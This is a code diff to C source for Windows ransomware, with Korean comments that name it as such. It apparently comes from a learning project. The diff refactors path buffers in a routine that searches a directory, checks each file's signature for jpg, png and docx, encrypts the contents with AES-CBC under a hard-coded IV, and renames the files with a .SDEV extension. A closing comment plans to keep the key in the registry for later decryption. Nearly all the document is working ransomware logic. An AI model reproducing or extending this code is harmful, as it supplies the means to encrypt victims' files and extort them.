@@ -9,8 +9,8 @@
 #include "aes.h"
 
 typedef struct Directorytarget {
-    wchar_t addr[100]; // 파일 경로 주소
-    wchar_t file[1000][100]; // 파일 
+    wchar_t addr[1000]; // 파일 경로 주소
+    wchar_t file[1000]; //랜섬웨어 타겟으로 설정할 파일
 }target;
 
 
@@ -28,12 +28,12 @@ wchar_t* getUserName() {
 }
 
 void calldir(target* t, unsigned char* key) {
-    wchar_t path[100]; //랜섬웨어 타겟으로 설정할 최대 디렉터리 수
-    wchar_t path1[100];
-    wcscpy(path, t->addr);
+    //wchar_t path[1000]; 
+    wchar_t path1[1000]; //Readfile, Writefile, 확장자 변경을 위한 path1
+    wcscpy(t->file, t->addr);
 
     //signature 확인하고 target.file에 넣을 지 말지 체크하기 위한 배열 선언
-    BYTE signature[204800];// jpg, png, docx 체크
+    BYTE signature[20480];// jpg, png, docx 체크
     
     struct AES_ctx ctx;
     uint8_t iv[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
@@ -44,11 +44,11 @@ void calldir(target* t, unsigned char* key) {
 
     printf("\n----------------------\n");
     //printf("before : %S", path);
-    wcscat(path, L"*");
+    wcscat(t->file, L"*");
     //printf("\n");
-    printf("path :%S", path);
+    printf("path :%S", t->file);
 
-    hFind = FindFirstFileW(path, &FindData);//파일 검색 시작
+    hFind = FindFirstFileW(t->file, &FindData);//파일 검색 시작
 
     if (hFind == INVALID_HANDLE_VALUE) {
         puts("NO FILE.");
@@ -56,10 +56,10 @@ void calldir(target* t, unsigned char* key) {
     }
 
     do {
-        wcscpy(path, t->addr); // 그냥 다시 리셋해서 주소 받고
-        wcscat(path, FindData.cFileName); // 파일 이름 추가
+        wcscpy(t->file, t->addr); // 그냥 다시 리셋해서 주소 받고
+        wcscat(t->file, FindData.cFileName); // 파일 이름 추가
 
-        HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        HANDLE hFile = CreateFileW(t->file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
         if (hFile != INVALID_HANDLE_VALUE) {
             DWORD bytesRead = 1;
             //DWORD bytesRead1;
@@ -81,7 +81,7 @@ void calldir(target* t, unsigned char* key) {
                     AES_init_ctx_iv(&ctx, key, iv);
                     AES_CBC_encrypt_buffer(&ctx, in, bytesRead);
 
-                    wcscpy(path1, path);
+                    wcscpy(path1, t->file);
                     //path를 핸들링 해서 .SDEV로 바꾸고 그 path1을
                     
                     wchar_t* dotPos = wcsrchr(path1, L'.');
@@ -129,7 +129,7 @@ void calldir(target* t, unsigned char* key) {
                     AES_init_ctx_iv(&ctx, key, iv);
                     AES_CBC_encrypt_buffer(&ctx, in, bytesRead);
 
-                    wcscpy(path1, path);
+                    wcscpy(path1, t->file);
                     //path를 핸들링 해서 .SDEV로 바꾸고 그 path1을
 
                     wchar_t* dotPos = wcsrchr(path1, L'.');
@@ -178,7 +178,7 @@ void calldir(target* t, unsigned char* key) {
                     AES_init_ctx_iv(&ctx, key, iv);
                     AES_CBC_encrypt_buffer(&ctx, in, bytesRead);
 
-                    wcscpy(path1, path);
+                    wcscpy(path1,t->file);
                     //path를 핸들링 해서 .SDEV로 바꾸고 그 path1을
 
                     wchar_t* dotPos = wcsrchr(path1, L'.');
@@ -314,6 +314,7 @@ int main()
 
 
     // decryption.c: 똑같이 파일 다 불러오고
+    
     // key을 레지스트리에서 읽어오고
     // decrypt 실행해서 원본파일 복원하기
     return 0;
